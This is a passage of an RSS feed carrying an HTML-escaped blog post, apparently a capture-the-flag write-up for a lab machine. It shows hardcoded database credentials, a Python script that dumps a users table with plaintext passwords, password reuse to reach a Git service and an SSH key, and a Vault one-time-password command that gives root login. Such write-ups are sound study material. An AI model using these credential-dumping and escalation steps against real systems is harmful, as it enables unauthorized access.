+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FLASK_DEBUG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Do not use debug mode in production&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Flask-Restplus settings&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_SWAGGER_UI_DOC_EXPANSION &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;list&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_VALIDATE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_MASK_SWAGGER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_ERROR_404_HELP &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CRAFT_API_SECRET &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hz66OCkDtv8G6D&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# database&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_USER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_PASSWORD &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;qLGockJ6G2J75O&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_DB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_HOST &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQLALCHEMY_TRACK_MODIFICATIONS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Another credentials, ok&amp;hellip; but what can we do with them? Well, he is using them to connect to the db so let&amp;rsquo;s do the same:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pymysql
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; craft_api &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; settings
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# test connection to mysql database&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pymysql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;qLGockJ6G2J75O&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             db&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             cursorclass&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pymysql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cursors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DictCursor)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; connection&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cursor() &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; cursor:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sql &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select * from users&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        cursor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute(sql)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cursor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fetchall()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(result)):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(result[i])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    connection&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;dinesh&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;4aUh0A8PbVJxgd&amp;#39;}
+{&amp;#39;id&amp;#39;: 4, &amp;#39;username&amp;#39;: &amp;#39;ebachman&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;llJ77D8QFkLPQB&amp;#39;}
+{&amp;#39;id&amp;#39;: 5, &amp;#39;username&amp;#39;: &amp;#39;gilfoyle&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;ZEU3N8WNM2rh4T&amp;#39;}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice we&amp;rsquo;ve now got the credentials for every user.
+Now what?&lt;/p&gt;
+&lt;p&gt;At this point I thought to SSH with the found credentials, but it didn&amp;rsquo;t work. So after getting into some really deep rabbit holes I&amp;rsquo;ve decided to try to connect to the Gogs page with the new secrets as a last hope.&lt;/p&gt;
+&lt;p&gt;And I&amp;rsquo;ve got in with the gilfoyle user, prompted with this:
+&lt;img src=&#34;https://i.imgur.com/Zwo1dtQ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note: Don&amp;rsquo;t overcomplicate things, work with what you have and exhaust every possibility before moving on&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ve instantly looked at the &lt;code&gt;.ssh&lt;/code&gt; folder and found the private key and therefore got user.&lt;/p&gt;
+&lt;h1 id=&#34;getting-root&#34;&gt;Getting root&lt;/h1&gt;
+&lt;p&gt;Once I&amp;rsquo;ve got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.&lt;/p&gt;
+&lt;p&gt;After looking through almost everything, the &lt;code&gt;vault/secrets.sh&lt;/code&gt; popped as the most interesting to have a look at:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set up vault secrets backend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault secrets enable ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault write ssh/roles/root_otp &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        key_type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;otp &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        default_user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;root &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        cidr_list&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0.0.0.0/0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the help from Google I&amp;rsquo;ve found &lt;a href=&#34;https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html&#34;&gt;this&lt;/a&gt;. I&amp;rsquo;ve just followed the article:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault write ssh/creds/otp_key_role ip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.10.110
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Got the otp and used it to connect through SSH, since root was allowed to login.&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
